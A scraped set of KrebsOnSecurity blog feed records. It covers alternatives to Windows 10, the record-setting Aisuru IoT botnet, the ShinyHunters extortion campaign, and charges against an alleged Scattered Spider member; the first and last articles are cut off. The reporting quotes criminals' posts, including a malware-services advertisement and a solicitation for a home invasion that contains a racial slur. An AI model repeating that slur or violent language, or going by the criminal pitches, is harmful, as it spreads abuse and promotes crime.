Windows 10 systems, you’ve probably already determined whether your PC meets the technical hardware specs recommended for the Windows 11 OS. If you’re reluctant or unable to migrate a Windows 10 system to Windows 11, there are alternatives to simply continuing to use Windows 10 without ongoing security updates.\nOne option is to pay for another year’s worth of security updates through Microsoft’s Extended Security Updates (ESU) program. The cost is just $30 if you don’t have a Microsoft account, and apparently free if you register the PC to a Microsoft account. This video breakdown from Ask Your Computer Guy does a good job of walking Windows 10 users through this process. Microsoft emphasizes that ESU enrollment does not provide other types of fixes, feature improvements or product enhancements. It also does not come with technical support.\nWindows 10 users also have the option of installing some flavor of Linux instead. Anyone seriously considering this option should check out the website endof10.org, which includes a plethora of tips and a DIY installation guide.\nLinux Mint is a great option for Linux newbies. Like most modern Linux versions, Mint will run on anything with a 64-bit CPU that has at least 2GB of memory, although 4GB is recommended. In other words, it will run on almost any computer produced in the last decade.\nLinux Mint also is likely to be the most intuitive interface for regular Windows users, and it is largely configurable without any fuss at the text-only command-line prompt. Mint and other flavors of Linux come with LibreOffice, which is an open source suite of tools that includes applications similar to Microsoft Office, and it can open, edit and save documents as Microsoft Office files.\nIf you’d prefer to give Linux a test drive before installing it on a Windows PC, you can always just download it to a removable USB drive. From there, reboot the computer (with the removable drive plugged in) and select the option at startup to run the operating system from the external USB drive. If you don’t see an option for that after restarting, try restarting again and hitting the F8 button, which should open a list of bootable drives. Here’s a fairly thorough tutorial that walks through exactly how to do all this.\nAnd if this is your first time trying out Linux, relax and have fun: The nice thing about a “live” version of Linux (as it’s called when the operating system is run from a removable drive such as a CD or a USB stick) is that none of your changes persist after a reboot. Even if you somehow manage to break something, a restart will return the system back to its original state.\nAs ever, if you experience any difficulties during or after applying this month’s batch of patches, please leave a note about it in the comments below.", "timestamp": "2025-10-21T13:35:08.716777"}
{"source": "blog", "feed": "https://krebsonsecurity.com/feed/", "title": "DDoS Botnet Aisuru Blankets US ISPs in Record DDoS", "url": "https://krebsonsecurity.com/2025/10/ddos-botnet-aisuru-blankets-us-isps-in-record-ddos/", "published": "Fri, 10 Oct 2025 16:10:43 +0000", "content": "The world’s largest and most disruptive botnet is now drawing a majority of its firepower from compromised Internet-of-Things (IoT) devices hosted on U.S. Internet providers like AT&T, Comcast and Verizon, new evidence suggests. Experts say the heavy concentration of infected devices at U.S. providers is complicating efforts to limit collateral damage from the botnet’s attacks, which shattered previous records this week with a brief traffic flood that clocked in at nearly 30 trillion bits of data per second.\nSince its debut more than a year ago, the Aisuru botnet has steadily outcompeted virtually all other IoT-based botnets in the wild, with recent attacks siphoning Internet bandwidth from an estimated 300,000 compromised hosts worldwide.\nThe hacked systems that get subsumed into the botnet are mostly consumer-grade routers, security cameras, digital video recorders and other devices operating with insecure and outdated firmware, and/or factory-default settings. Aisuru’s owners are continuously scanning the Internet for these vulnerable devices and enslaving them for use in distributed denial-of-service (DDoS) attacks that can overwhelm targeted servers with crippling amounts of junk traffic.\nAs Aisuru’s size has mushroomed, so has its punch. In May 2025, KrebsOnSecurity was hit with a near-record 6.35 terabits per second (Tbps) attack from Aisuru, which was then the largest assault that Google’s DDoS protection service Project Shield had ever mitigated. Days later, Aisuru shattered that record with a data blast in excess of 11 Tbps.\nBy late September, Aisuru was publicly flexing DDoS capabilities topping 22 Tbps. Then on October 6, its operators heaved a whopping 29.6 terabits of junk data packets each second at a targeted host. Hardly anyone noticed because it appears to have been a brief test or demonstration of Aisuru’s capabilities: The traffic flood lasted less only a few seconds and was pointed at an Internet server that was specifically designed to measure large-scale DDoS attacks.\nAisuru’s overlords aren’t just showing off. Their botnet is being blamed for a series of increasingly massive and disruptive attacks. Although recent assaults from Aisuru have targeted mostly ISPs that serve online gaming communities like Minecraft, those digital sieges often result in widespread collateral Internet disruption.\nFor the past several weeks, ISPs hosting some of the Internet’s top gaming destinations have been hit with a relentless volley of gargantuan attacks that experts say are well beyond the DDoS mitigation capabilities of most organizations connected to the Internet today.\nSteven Ferguson is principal security engineer at Global Secure Layer (GSL), an ISP in Brisbane, Australia. GSL hosts TCPShield, which offers free or low-cost DDoS protection to more than 50,000 Minecraft servers worldwide. Ferguson told KrebsOnSecurity that on October 8, TCPShield was walloped with a blitz from Aisuru that flooded its network with more than 15 terabits of junk data per second.\nFerguson said that after the attack subsided, TCPShield was told by its upstream provider OVH that they were no longer welcome as a customer.\n“This was causing serious congestion on their Miami external ports for several weeks, shown publicly via their weather map,” he said, explaining that TCPShield is now solely protected by GSL.\nTraces from the recent spate of crippling Aisuru attacks on gaming servers can be still seen at the website blockgametracker.gg, which indexes the uptime and downtime of the top Minecraft hosts. In the following example from a series of data deluges on the evening of September 28, we can see an Aisuru botnet campaign briefly knocked TCPShield offline.\nPaging through the same uptime graphs for other network operators listed shows almost all of them suffered brief but repeated outages around the same time. Here is the same uptime tracking for Minecraft servers on the network provider Cosmic (AS30456), and it shows multiple large dips that correspond to game server outages caused by Aisuru.\nBOTNETS R US\nFerguson said he’s been tracking Aisuru for about three months, and recently he noticed the botnet’s composition shifted heavily toward infected systems at ISPs in the United States. Ferguson shared logs from an attack on October 8 that indexed traffic by the total volume sent through each network provider, and the logs showed that 11 of the top 20 traffic sources were U.S. based ISPs.\nAT&T customers were by far the biggest U.S. contributors to that attack, followed by botted systems on Charter Communications, Comcast, T-Mobile and Verizon, Ferguson found. He said the volume of data packets per second coming from infected IoT hosts on these ISPs is often so high that it has started to affect the quality of service that ISPs are able to provide to adjacent (non-botted) customers.\n“The impact extends beyond victim networks,” Ferguson said. “For instance we have seen 500 gigabits of traffic via Comcast’s network alone. This amount of egress leaving their network, especially being so US-East concentrated, will result in congestion towards other services or content trying to be reached while an attack is ongoing.”\nRoland Dobbins is principal engineer at Netscout. Dobbins said Ferguson is spot on, noting that while most ISPs have effective mitigations in place to handle large incoming DDoS attacks, many are far less prepared to manage the inevitable service degradation caused by large numbers of their customers suddenly using some or all available bandwidth to attack others.\n“The outbound and cross-bound DDoS attacks can be just as disruptive as the inbound stuff,” Dobbin said. “We’re now in a situation where ISPs are routinely seeing terabit-per-second plus outbound attacks from their networks that can cause operational problems.”\n“The crying need for effective and universal outbound DDoS attack suppression is something that is really being highlighted by these recent attacks,” Dobbins continued. “A lot of network operators are learning that lesson now, and there’s going to be a period ahead where there’s some scrambling and potential disruption going on.”\nKrebsOnSecurity sought comment from the ISPs named in Ferguson’s report. Charter Communications pointed to a recent blog post on protecting its network, stating that Charter actively monitors for both inbound and outbound attacks, and that it takes proactive action wherever possible.\n“In addition to our own extensive network security, we also aim to reduce the risk of customer connected devices contributing to attacks through our Advanced WiFi solution that includes Security Shield, and we make Security Suite available to our Internet customers,” Charter wrote in an emailed response to questions. “With the ever-growing number of devices connecting to networks, we encourage customers to purchase trusted devices with secure development and manufacturing practices, use anti-virus and security tools on their connected devices, and regularly download security patches.”\nA spokesperson for Comcast responded, “Currently our network is not experiencing impacts and we are able to handle the traffic.”\n9 YEARS OF MIRAI\nAisuru is built on the bones of malicious code that was leaked in 2016 by the original creators of the Mirai IoT botnet. Like Aisuru, Mirai quickly outcompeted all other DDoS botnets in its heyday, and obliterated previous DDoS attack records with a 620 gigabit-per-second siege that sidelined this website for nearly four days in 2016.\nThe Mirai botmasters likewise used their crime machine to attack mostly Minecraft servers, but with the goal of forcing Minecraft server owners to purchase a DDoS protection service that they controlled. In addition, they rented out slices of the Mirai botnet to paying customers, some of whom used it to mask the sources of other types of cybercrime, such as click fraud.\nDobbins said Aisuru’s owners also appear to be renting out their botnet as a distributed proxy network that cybercriminal customers anywhere in the world can use to anonymize their malicious traffic and make it appear to be coming from regular residential users in the U.S.\n“The people who operate this botnet are also selling (it as) residential proxies,” he said. “And that’s being used to reflect application layer attacks through the proxies on the bots as well.”\nThe Aisuru botnet harkens back to its predecessor Mirai in another intriguing way. One of its owners is using the Telegram handle “9gigsofram,” which corresponds to the nickname used by the co-owner of a Minecraft server protection service called Proxypipe that was heavily targeted in 2016 by the original Mirai botmasters.\nRobert Coelho co-ran Proxypipe back then along with his business partner Erik “9gigsofram” Buckingham, and has spent the past nine years fine-tuning various DDoS mitigation companies that cater to Minecraft server operators and other gaming enthusiasts. Coelho said he has no idea why one of Aisuru’s botmasters chose Buckingham’s nickname, but added that it might say something about how long this person has been involved in the DDoS-for-hire industry.\n“The Aisuru attacks on the gaming networks these past seven day have been absolutely huge, and you can see tons of providers going down multiple times a day,” Coelho said.\nCoelho said the 15 Tbps attack this week against TCPShield was likely only a portion of the total attack volume hurled by Aisuru at the time, because much of it would have been shoved through networks that simply couldn’t process that volume of traffic all at once. Such outsized attacks, he said, are becoming increasingly difficult and expensive to mitigate.\n“It’s definitely at the point now where you need to be spending at least a million dollars a month just to have the network capacity to be able to deal with these attacks,” he said.\nRAPID SPREAD\nAisuru has long been rumored to use multiple zero-day vulnerabilities in IoT devices to aid its rapid growth over the past year. XLab, the Chinese security company that was the first to profile Aisuru’s rise in 2024, warned last month that one of the Aisuru botmasters had compromised the firmware distribution website for Totolink, a maker of low-cost routers and other networking gear.\n“Multiple sources indicate the group allegedly compromised a router firmware update server in April and distributed malicious scripts to expand the botnet,” XLab wrote on September 15. “The node count is currently reported to be around 300,000.”\nAisuru’s operators received an unexpected boost to their crime machine in August when the U.S. Department Justice charged the alleged proprietor of Rapper Bot, a DDoS-for-hire botnet that competed directly with Aisuru for control over the global pool of vulnerable IoT systems.\nOnce Rapper Bot was dismantled, Aisuru’s curators moved quickly to commandeer vulnerable IoT devices that were suddenly set adrift by the government’s takedown, Dobbins said.\n“Folks were arrested and Rapper Bot control servers were seized and that’s great, but unfortunately the botnet’s attack assets were then pieced out by the remaining botnets,” he said. “The problem is, even if those infected IoT devices are rebooted and cleaned up, they will still get re-compromised by something else generally within minutes of being plugged back in.”\nBOTMASTERS AT LARGE\nXLab’s September blog post cited multiple unnamed sources saying Aisuru is operated by three cybercriminals: “Snow,” who’s responsible for botnet development; “Tom,” tasked with finding new vulnerabilities; and “Forky,” responsible for botnet sales.\nKrebsOnSecurity interviewed Forky in our May 2025 story about the record 6.3 Tbps attack from Aisuru. That story identified Forky as a 21-year-old man from Sao Paulo, Brazil who has been extremely active in the DDoS-for-hire scene since at least 2022. The FBI has seized Forky’s DDoS-for-hire domains several times over the years.\nLike the original Mirai botmasters, Forky also operates a DDoS mitigation service called Botshield. Forky declined to discuss the makeup of his ISP’s clientele, or to clarify whether Botshield was more of a hosting provider or a DDoS mitigation firm. However, Forky has posted on Telegram about Botshield successfully mitigating large DDoS attacks launched against other DDoS-for-hire services.\nIn our previous interview, Forky acknowledged being involved in the development and marketing of Aisuru, but denied participating in attacks launched by the botnet.\nReached for comment earlier this month, Forky continued to maintain his innocence, claiming that he also is still trying to figure out who the current Aisuru botnet operators are in real life (Forky said the same thing in our May interview).\nBut after a week of promising juicy details, Forky came up empty-handed once again. Suspecting that Forky was merely being coy, I asked him how someone so connected to the DDoS-for-hire world could still be mystified on this point, and suggested that his inability or unwillingness to blame anyone else for Aisuru would not exactly help his case.\nAt this, Forky verbally bristled at being pressed for more details, and abruptly terminated our interview.\n“I’m not here to be threatened with ignorance because you are stressed,” Forky replied. “They’re blaming me for those new attacks. Pretty much the whole world (is) due to your blog.”", "timestamp": "2025-10-21T13:35:09.724770"}
{"source": "blog", "feed": "https://krebsonsecurity.com/feed/", "title": "ShinyHunters Wage Broad Corporate Extortion Spree", "url": "https://krebsonsecurity.com/2025/10/shinyhunters-wage-broad-corporate-extortion-spree/", "published": "Tue, 07 Oct 2025 22:45:35 +0000", "content": "A cybercriminal group that used voice phishing attacks to siphon more than a billion records from Salesforce customers earlier this year has launched a website that threatens to publish data stolen from dozens of Fortune 500 firms if they refuse to pay a ransom. The group also claimed responsibility for a recent breach involving Discord user data, and for stealing terabytes of sensitive files from thousands of customers of the enterprise software maker Red Hat.\nIn May 2025, a prolific and amorphous English-speaking cybercrime group known as ShinyHunters launched a social engineering campaign that used voice phishing to trick targets into connecting a malicious app to their organization’s Salesforce portal.\nThe first real details about the incident came in early June, when the Google Threat Intelligence Group (GTIG) warned that ShinyHunters — tracked by Google as UNC6040 — was extorting victims over their stolen Salesforce data, and that the group was poised to launch a data leak site to publicly shame victim companies into paying a ransom to keep their records private. A month later, Google acknowledged that one of its own corporate Salesforce instances was impacted in the voice phishing campaign.\nLast week, a new victim shaming blog dubbed “Scattered LAPSUS$ Hunters” began publishing the names of companies that had customer Salesforce data stolen as a result of the May voice phishing campaign.\n“Contact us to negotiate this ransom or all your customers data will be leaked,” the website stated in a message to Salesforce. “If we come to a resolution all individual extortions against your customers will be withdrawn from. Nobody else will have to pay us, if you pay, Salesforce, Inc.”\nBelow that message were more than three dozen entries for companies that allegedly had Salesforce data stolen, including Toyota, FedEx, Disney/Hulu, and UPS. The entries for each company specified the volume of stolen data available, as well as the date that the information was retrieved (the stated breach dates range between May and September 2025).\nOn October 5, the Scattered LAPSUS$ Hunters victim shaming and extortion blog announced that the group was responsible for a breach in September involving a GitLab server used by Red Hat that contained more than 28,000 Git code repositories, including more than 5,000 Customer Engagement Reports (CERs).\n“Alot of folders have their client’s secrets such as artifactory access tokens, git tokens, azure, docker (redhat docker, azure containers, dockerhub), their client’s infrastructure details in the CERs like the audits that were done for them, and a whole LOT more, etc.,” the hackers claimed.\nTheir claims came several days after a previously unknown hacker group calling itself the Crimson Collective took credit for the Red Hat intrusion on Telegram.\nRed Hat disclosed on October 2 that attackers had compromised a company GitLab server, and said it was in the process of notifying affected customers.\n“The compromised GitLab instance housed consulting engagement data, which may include, for example, Red Hat’s project specifications, example code snippets, internal communications about consulting services, and limited forms of business contact information,” Red Hat wrote.\nSeparately, Discord has started emailing users affected by another breach claimed by ShinyHunters. Discord said an incident on September 20 at a “third-party customer service provider” impacted a “limited number of users” who communicated with Discord customer support or Trust & Safety teams. The information included Discord usernames, emails, IP address, the last four digits of any stored payment cards, and government ID images submitted during age verification appeals.\nThe Scattered Lapsus$ Hunters claim they will publish data stolen from Salesforce and its customers if ransom demands aren’t paid by October 10. The group also claims it will soon begin extorting hundreds more organizations that lost data in August after a cybercrime group stole vast amounts of authentication tokens from Salesloft, whose AI chatbot is used by many corporate websites to convert customer interaction into Salesforce leads.\nIn a communication sent to customers today, Salesforce emphasized that the theft of any third-party Salesloft data allegedly stolen by ShinyHunters did not originate from a vulnerability within the core Salesforce platform. The company also stressed that it has no plans to meet any extortion demands.\n“Salesforce will not engage, negotiate with, or pay any extortion demand,” the message to customers read. “Our focus is, and remains, on defending our environment, conducting thorough forensic analysis, supporting our customers, and working with law enforcement and regulatory authorities.”\nThe GTIG tracked the group behind the Salesloft data thefts as UNC6395, and says the group has been observed harvesting the data for authentication tokens tied to a range of cloud services like Snowflake and Amazon’s AWS.\nGoogle catalogs Scattered Lapsus$ Hunters by so many UNC names (throw in UNC6240 for good measure) because it is thought to be an amalgamation of three hacking groups — Scattered Spider, Lapsus$ and ShinyHunters. The members of these groups hail from many of the same chat channels on the Com, a mostly English-language cybercriminal community that operates across an ocean of Telegram and Discord servers.\nThe Scattered Lapsus$ Hunters darknet blog is currently offline. The outage appears to have coincided with the disappearance of the group’s new clearnet blog — breachforums[.]hn — which vanished after shifting its Domain Name Service (DNS) servers from DDoS-Guard to Cloudflare.\nBut before it died, the websites disclosed that hackers were exploiting a critical zero-day vulnerability in Oracle’s E-Business Suite software. Oracle has since confirmed that a security flaw tracked as CVE-2025-61882 allows attackers to perform unauthenticated remote code execution, and is urging customers to apply an emergency update to address the weakness.\nMandiant’s Charles Carmakal shared on LinkedIn that CVE-2025-61882 was initially exploited in August 2025 by the Clop ransomware gang to steal data from Oracle E-Business Suite servers. Bleeping Computer writes that news of the Oracle zero-day first surfaced on the Scattered Lapsus$ Hunters blog, which published a pair of scripts that were used to exploit vulnerable Oracle E-Business Suite instances.\nOn Monday evening, KrebsOnSecurity received a malware-laced message from a reader that threatened physical violence unless their unstated demands were met. The missive, titled “Shiny hunters,” contained the hashtag $LAPSU$$SCATEREDHUNTER, and urged me to visit a page on limewire[.]com to view their demands.\nKrebsOnSecurity did not visit this link, but instead forwarded it to Mandiant, which confirmed that similar menacing missives were sent to employees at Mandiant and other security firms around the same time.\nThe link in the message fetches a malicious trojan disguised as a Windows screensaver file (Virustotal’s analysis on this malware is here). Simply viewing the booby-trapped screensaver on a Windows PC is enough to cause the bundled trojan to launch in the background.\nMandiant’s Austin Larsen said the trojan is a commercially available backdoor known as ASYNCRAT, a .NET-based backdoor that communicates using a custom binary protocol over TCP, and can execute shell commands and download plugins to extend its features.\n“Downloaded plugins may be executed directly in memory or stored in the registry,” Larsen wrote in an analysis shared via email. “Capabilities added via plugins include screenshot capture, file transfer, keylogging, video capture, and cryptocurrency mining. ASYNCRAT also supports a plugin that targets credentials stored by Firefox and Chromium-based web browsers.”\nMalware-laced targeted emails are not out of character for certain members of the Scattered Lapsus$ Hunters, who have previously harassed and threatened security researchers and even law enforcement officials who are investigating and warning about the extent of their attacks.\nWith so many big data breaches and ransom attacks now coming from cybercrime groups operating on the Com, law enforcement agencies on both sides of the pond are under increasing pressure to apprehend the criminal hackers involved. In late September, prosecutors in the U.K. charged two alleged Scattered Spider members aged 18 and 19 with extorting at least $115 million in ransom payments from companies victimized by data theft.\nU.S. prosecutors heaped their own charges on the 19 year-old in that duo — U.K. resident Thalha Jubair — who is alleged to have been involved in data ransom attacks against Marks & Spencer and Harrods, the British food retailer Co-op Group, and the 2023 intrusions at MGM Resorts and Caesars Entertainment. Jubair also was allegedly a key member of LAPSUS$, a cybercrime group that broke into dozens of technology companies beginning in late 2021.\nIn August, convicted Scattered Spider member and 20-year-old Florida man Noah Michael Urban was sentenced to 10 years in federal prison and ordered to pay roughly $13 million in restitution to victims.\nIn April 2025, a 23-year-old Scottish man thought to be an early Scattered Spider member was extradited from Spain to the U.S., where he is facing charges of wire fraud, conspiracy and identity theft. U.S. prosecutors allege Tyler Robert Buchanan and co-conspirators hacked into dozens of companies in the United States and abroad, and that he personally controlled more than $26 million stolen from victims.\nUpdate, Oct. 8, 8:59 a.m. ET: A previous version of this story incorrectly referred to the malware sent by the reader as a Windows screenshot file. Rather, it is a Windows screensaver file.", "timestamp": "2025-10-21T13:35:10.716952"}
{"source": "blog", "feed": "https://krebsonsecurity.com/feed/", "title": "Feds Tie ‘Scattered Spider’ Duo to $115M in Ransoms", "url": "https://krebsonsecurity.com/2025/09/feds-tie-scattered-spider-duo-to-115m-in-ransoms/", "published": "Wed, 24 Sep 2025 11:48:31 +0000", "content": "U.S. prosecutors last week levied criminal hacking charges against 19-year-old U.K. national Thalha Jubair for allegedly being a core member of Scattered Spider, a prolific cybercrime group blamed for extorting at least $115 million in ransom payments from victims. The charges came as Jubair and an alleged co-conspirator appeared in a London court to face accusations of hacking into and extorting several large U.K. retailers, the London transit system, and healthcare providers in the United States.\nAt a court hearing last week, U.K. prosecutors laid out a litany of charges against Jubair and 18-year-old Owen Flowers, accusing the teens of involvement in an August 2024 cyberattack that crippled Transport for London, the entity responsible for the public transport network in the Greater London area.\nOn July 10, 2025, KrebsOnSecurity reported that Flowers and Jubair had been arrested in the United Kingdom in connection with recent Scattered Spider ransom attacks against the retailers Marks & Spencer and Harrods, and the British food retailer Co-op Group.\nThat story cited sources close to the investigation saying Flowers was the Scattered Spider member who anonymously gave interviews to the media in the days after the group’s September 2023 ransomware attacks disrupted operations at Las Vegas casinos operated by MGM Resorts and Caesars Entertainment.\nThe story also noted that Jubair’s alleged handles on cybercrime-focused Telegram channels had far lengthier rap sheets involving some of the more consequential and headline-grabbing data breaches over the past four years. What follows is an account of cybercrime activities that prosecutors have attributed to Jubair’s alleged hacker handles, as told by those accounts in posts to public Telegram channels that are closely monitored by multiple cyber intelligence firms.\nEARLY DAYS (2021-2022)\nJubair is alleged to have been a core member of the LAPSUS$ cybercrime group that broke into dozens of technology companies beginning in late 2021, stealing source code and other internal data from tech giants including Microsoft, Nvidia, Okta, Rockstar Games, Samsung, T-Mobile, and Uber.\nThat is, according to the former leader of the now-defunct LAPSUS$. In April 2022, KrebsOnSecurity published internal chat records taken from a server that LAPSUS$ used, and those chats indicate Jubair was working with the group using the nicknames Amtrak and Asyntax. In the middle of the gang’s cybercrime spree, Asyntax told the LAPSUS$ leader not to share T-Mobile’s logo in images sent to the group because he’d been previously busted for SIM-swapping and his parents would suspect he was back at it again.\nThe leader of LAPSUS$ responded by gleefully posting Asyntax’s real name, phone number, and other hacker handles into a public chat room on Telegram:\nThat story about the leaked LAPSUS$ chats also connected Amtrak/Asyntax to several previous hacker identities, including “Everlynn,” who in April 2021 began offering a cybercriminal service that sold fraudulent “emergency data requests” targeting the major social media and email providers.\nIn these so-called “fake EDR” schemes, the hackers compromise email accounts tied to police departments and government agencies, and then send unauthorized demands for subscriber data (e.g. username, IP/email address), while claiming the information being requested can’t wait for a court order because it relates to an urgent matter of life and death.\nEARTHTOSTAR\nProsecutors in New Jersey last week alleged Jubair was part of a threat group variously known as Scattered Spider, 0ktapus, and UNC3944, and that he used the nicknames EarthtoStar, Brad, Austin, and Austistic.\nBeginning in 2022, EarthtoStar co-ran a bustling Telegram channel called Star Chat, which was home to a prolific SIM-swapping group that relentlessly used voice- and SMS-based phishing attacks to steal credentials from employees at the major wireless providers in the U.S. and U.K.\nThe group would then use that access to sell a SIM-swapping service that could redirect a target’s phone number to a device the attackers controlled, allowing them to intercept the victim’s phone calls and text messages (including one-time codes). Members of Star Chat targeted multiple wireless carriers with SIM-swapping attacks, but they focused mainly on phishing T-Mobile employees.\nIn February 2023, KrebsOnSecurity scrutinized more than seven months of these SIM-swapping solicitations on Star Chat, which almost daily peppered the public channel with “Tmo up!” and “Tmo down!” notices indicating periods wherein the group claimed to have active access to T-Mobile’s network.\nThe data showed that Star Chat — along with two other SIM-swapping groups operating at the same time — collectively broke into T-Mobile over a hundred times in the last seven months of 2022. However, Star Chat was by far the most prolific of the three, responsible for at least 70 of those incidents.\nA review of EarthtoStar’s messages on Star Chat as indexed by the threat intelligence firm Flashpoint shows this person also sold “AT&T email resets” and AT&T call forwarding services for up to $1,200 per line. EarthtoStar explained the purpose of this service in post on Telegram:\n“Ok people are confused, so you know when u login to chase and it says ‘2fa required’ or whatever the fuck, well it gives you two options, SMS or Call. If you press call, and I forward the line to you then who do you think will get said call?”\nNew Jersey prosecutors allege Jubair also was involved in a mass SMS phishing campaign during the summer of 2022 that stole single sign-on credentials from employees at hundreds of companies. The text messages asked users to click a link and log in at a phishing page that mimicked their employer’s Okta authentication page, saying recipients needed to review pending changes to their upcoming work schedules.\nThe phishing websites used a Telegram instant message bot to forward any submitted credentials in real-time, allowing the attackers to use the phished username, password and one-time code to log in as that employee at the real employer website.\nThat weeks-long SMS phishing campaign led to intrusions and data thefts at more than 130 organizations, including LastPass, DoorDash, Mailchimp, Plex and Signal.\nDA, COMRADE\nEarthtoStar’s group Star Chat specialized in phishing their way into business process outsourcing (BPO) companies that provide customer support for a range of multinational companies, including a number of the world’s largest telecommunications providers. In May 2022, EarthtoStar posted to the Telegram channel “Frauwudchat”:\n“Hi, I am looking for partners in order to exfiltrate data from large telecommunications companies/call centers/alike, I have major experience in this field, [including] a massive call center which houses 200,000+ employees where I have dumped all user credentials and gained access to the [domain controller] + obtained global administrator I also have experience with REST API’s and programming. I have extensive experience with VPN, Citrix, cisco anyconnect, social engineering + privilege escalation. If you have any Citrix/Cisco VPN or any other useful things please message me and lets work.”\nAt around the same time in the Summer of 2022, at least two different accounts tied to Star Chat — “RocketAce” and “Lopiu” — introduced the group’s services to denizens of the Russian-language cybercrime forum Exploit, including:\n-SIM-swapping services targeting Verizon and T-Mobile customers;\n-Dynamic phishing pages targeting customers of single sign-on providers like Okta;\n-Malware development services;\n-The sale of extended validation (EV) code signing certificates.\nThese two accounts on Exploit created multiple sales threads in which they claimed administrative access to U.S. telecommunications providers and asked other Exploit members for help in monetizing that access. In June 2022, RocketAce, which appears to have been just one of EarthtoStar’s many aliases, posted to Exploit:\nHello. I have access to a telecommunications company’s citrix and vpn. I would like someone to help me break out of the system and potentially attack the domain controller so all logins can be extracted we can discuss payment and things leave your telegram in the comments or private message me ! Looking for someone with knowledge in citrix/privilege escalation\nOn Nov. 15, 2022, EarthtoStar posted to their Star Sanctuary Telegram channel that they were hiring malware developers with a minimum of three years of experience and the ability to develop rootkits, backdoors and malware loaders.\n“Optional: Endorsed by advanced APT Groups (e.g. Conti, Ryuk),” the ad concluded, referencing two of Russia’s most rapacious and destructive ransomware affiliate operations. “Part of a nation-state / ex-3l (3 letter-agency).”\n2023-PRESENT DAY\nThe Telegram and Discord chat channels wherein Flowers and Jubair allegedly planned and executed their extortion attacks are part of a loose-knit network known as the Com, an English-speaking cybercrime community consisting mostly of individuals living in the United States, the United Kingdom, Canada and Australia.\nMany of these Com chat servers have hundreds to thousands of members each, and some of the more interesting solicitations on these communities are job offers for in-person assignments and tasks that can be found if one searches for posts titled, “If you live near,” or “IRL job” — short for “in real life” job.\nThese “violence-as-a-service” solicitations typically involve “brickings,” where someone is hired to toss a brick through the window at a specified address. Other IRL jobs for hire include tire-stabbings, molotov cocktail hurlings, drive-by shootings, and even home invasions. The people targeted by these services are typically other criminals within the community, but it’s not unusual to see Com members asking others for help in harassing or intimidating security researchers and even the very law enforcement officers who are investigating their alleged crimes.\nIt remains unclear what precipitated this incident or what followed directly after, but on January 13, 2023, a Star Sanctuary account used by EarthtoStar solicited the home invasion of a sitting U.S. federal prosecutor from New York. That post included a photo of the prosecutor taken from the Justice Department’s website, along with the message:\n“Need irl niggas, in home hostage shit no fucking pussies no skinny glock holding 100 pound niggas either”\nThroughout late 2022 and early 2023, EarthtoStar’s alias “Brad” (a.k.a. “Brad_banned”) frequently advertised Star Chat’s malware development services, including custom malicious software designed to hide the attacker’s presence on a victim machine:\nWe can develop KERNEL malware which will achieve persistence for a long time,\nbypass firewalls and have reverse shell access.This shit is literally like STAGE 4 CANCER FOR COMPUTERS!!!\nKernel meaning the highest level of authority on a machine.\nThis can range to simple shells to Bootkits.Bypass all major EDR’s (SentinelOne, CrowdStrike, etc)\nPatch EDR’s scanning functionality so it’s rendered useless!Once implanted, extremely difficult to remove (basically impossible to even find)\nDevelopment Experience of several years and in multiple APT Groups.Be one step ahead of the game. Prices start from $5,000+. Message @brad_banned to get a quote\nIn September 2023 , both MGM Resorts and Caesars Entertainment suffered ransomware attacks at the hands of a Russian ransomware affiliate program known as ALPHV and BlackCat. Caesars reportedly paid a $15 million ransom in that incident.\nWithin hours of MGM publicly acknowledging the 2023 breach, members of Scattered Spider were claiming credit and telling reporters they’d broken in by social engineering a third-party IT vendor. At a hearing in London last week, U.K. prosecutors told the court Jubair was found in possession of more than $50 million in ill-gotten cryptocurrency, including funds that were linked to the Las Vegas casino hacks.\nThe Star Chat channel was finally banned by Telegram on March 9, 2025. But U.S. prosecutors say Jubair and fellow Scattered Spider members continued their hacking, phishing and extortion activities up until September 2025.\nIn April 2025, the Com was buzzing about the publication of “The Com Cast,” a lengthy screed detailing Jubair’s alleged cybercriminal activities and nicknames over the years. This account included photos and voice recordings allegedly of Jubair, and asserted that in his early days on the Com Jubair used the nicknames Clark and Miku (these are both aliases used by Everlynn in connection with their fake EDR services).\nMore recently, the anonymous Com Cast author(s) claimed, Jubair had used the nickname “Operator,” which corresponds to a Com member who ran an automated Telegram-based doxing service that pulled consumer records from hacked data broker accounts. That public outing came after Operator allegedly seized control over the Doxbin, a long-running and highly toxic community that is used to “dox” or post deeply personal information on people.\n“Operator/Clark/Miku: A key member of the ransomware group Scattered Spider, which consists of a diverse mix of individuals involved in SIM swapping and phishing,” the Com Cast account stated. “The group is an amalgamation of several key organizations, including Infinity Recursion (owned by Operator), True Alcorians (owned by earth2star), and Lapsus, which have come together to form a single collective.”\nThe New Jersey complaint (PDF) alleges Jubair and other Scattered Spider members committed computer fraud, wire fraud, and money laundering in relation to at least 120 computer network intrusions involving 47 U.S. entities between May 2022 and September 2025. The complaint alleges the group’s victims paid at least $115 million in ransom payments.\nU.S. authorities say they traced some of those payments to Scattered Spider to an Internet server controlled by Jubair. The complaint states that a cryptocurrency wallet discovered on that server was used to purchase several gift cards, one of which was used at a food delivery company to send food to his apartment. Another gift card purchased with cryptocurrency from the same server was allegedly used to fund online gaming accounts under Jubair’s name. U.S. prosecutors said that when they seized that server they also seized $36 million in cryptocurrency.\nThe complaint also charges Jubair with involvement in a hacking incident in January 2025 against the U.S. courts system that targeted a U.S. magistrate judge overseeing a related Scattered Spider investigation. That other investigation appears to have been the prosecution of Noah Michael Urban, a 20-year-old Florida man charged in November 2024 by prosecutors in Los Angeles as one of five alleged Scattered Spider members.\nUrban pleaded guilty in April 2025 to wire fraud and conspiracy charges, and in August he was sentenced to 10 years in federal prison. Speaking with KrebsOnSecurity from jail after his sentencing, Urban asserted that the judge gave him more time than prosecutors requested because he was mad that Scattered Spider hacked his email account.\nA court transcript (PDF) from a status hearing in February 2025 shows Urban was telling the truth about the hacking incident that happened while he was in federal custody. The judge told attorneys for both sides that a co-defendant in the California case was trying to find out about Mr. Urban’s activity in the Florida case, and that the hacker accessed the account by impersonating a judge over the phone and requesting a password reset.\nAllison Nixon is chief research officer at the New York based security firm Unit 221B, and easily one of the world’s leading experts on Com-based cybercrime activity. Nixon said the core problem with legally prosecuting well-known cybercriminals from the Com has traditionally been that the top offenders tend to be under the age of 18, and thus difficult to charge under federal hacking statutes.\nIn the United States, prosecutors typically wait until an underage cybercrime suspect becomes an adult to charge them. But until that day comes, she said, Com actors often feel emboldened to continue committing — and very often bragging about — serious cybercrime offenses.\n“Here we have a special category of Com offenders that effectively enjoy legal immunity,” Nixon told KrebsOnSecurity. “Most get recruited to Com groups when they are older, but of those that join very young, such as 12 or 13, they seem to be the most dangerous because at that age they have no grounding in reality and so much longevity before they exit their 